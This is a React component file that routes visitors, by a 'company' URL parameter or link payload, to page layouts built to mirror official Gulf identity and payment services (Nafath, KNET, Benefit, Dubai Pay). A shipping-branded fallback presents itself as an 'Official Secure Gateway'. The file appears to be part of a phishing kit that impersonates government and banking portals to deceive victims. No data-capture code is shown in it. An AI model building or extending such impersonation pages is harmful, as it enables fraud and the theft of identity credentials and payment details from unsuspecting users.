import React from 'react';
import { useSearchParams } from "react-router-dom";
import { PaymentEntityConfig, resolveEntity } from "@/config/gccPaymentEntities";
import { 
  NafathMirrorLayout, 
  KnetMirrorLayout, 
  DubaiPayMirrorLayout 
} from "./MirrorLayouts";
import { ThemedHeader } from "@/components/ui/ThemedHeader";

interface MirrorPageWrapperProps {
  children: React.ReactNode;
  entityId?: string;
  title?: string;
  subtitle?: string;
  linkData?: any;
  hideHeader?: boolean;
}

/**
 * MirrorPageWrapper
 * 
 * Central Visual Identity Router.
 * This component replaces the entire page shell to achieve 1:1 parity
 * with official apps (Nafath, KNET, Dubai Pay, etc.)
 */
export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({ 
  children, 
  entityId, 
  title, 
  subtitle,
  linkData,
  hideHeader = false
}) => {
  const [searchParams] = useSearchParams();
  
  // Priority: 1. Passed ID, 2. URL Param, 3. Link Payload, 4. Default
  const companyKey = entityId || searchParams.get("company") || linkData?.payload?.service_key || 'aramex';
  const normalizedKey = companyKey.toLowerCase().replace(/[^a-z0-9]/g, '');
  const entityConfig = resolveEntity(companyKey);

  // 1. NAFATH (Saudi Identity)
  if (normalizedKey.includes('nafath')) {
    return (
      <NafathMirrorLayout config={entityConfig} title={title}>
        {children}
      </NafathMirrorLayout>
    );
  }

  // 2. KNET / BENEFIT (Kuwait/Bahrain)
  if (normalizedKey.includes('knet') || normalizedKey.includes('benefit')) {
    return (
      <KnetMirrorLayout config={entityConfig}>
        {children}
      </KnetMirrorLayout>
    );
  }

  // 3. DUBAI PAY (UAE)
  if (normalizedKey.includes('dubai') || normalizedKey.includes('dubaipay')) {
    return (
      <DubaiPayMirrorLayout config={entityConfig} title={title}>
        {children}
      </DubaiPayMirrorLayout>
    );
  }

  // DEFAULT (Generic Layout for Shipping/Other)
  return (
    <div className="min-h-screen flex flex-col bg-background font-primary" dir="rtl">
      {!hideHeader && (
        <ThemedHeader
          config={entityConfig}
          title={entityConfig.nameAr}
          subtitle="E-Services & Payment Gateway"
        />
      )}
      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">{title || entityConfig.nameAr}</h2>
            <p className="text-sm font-medium uppercase tracking-wide text-muted-foreground">{subtitle || 'Official Secure Gateway'}</p>
          </div>
          {children}
        </div>
      </main>
    </div>
  );
};
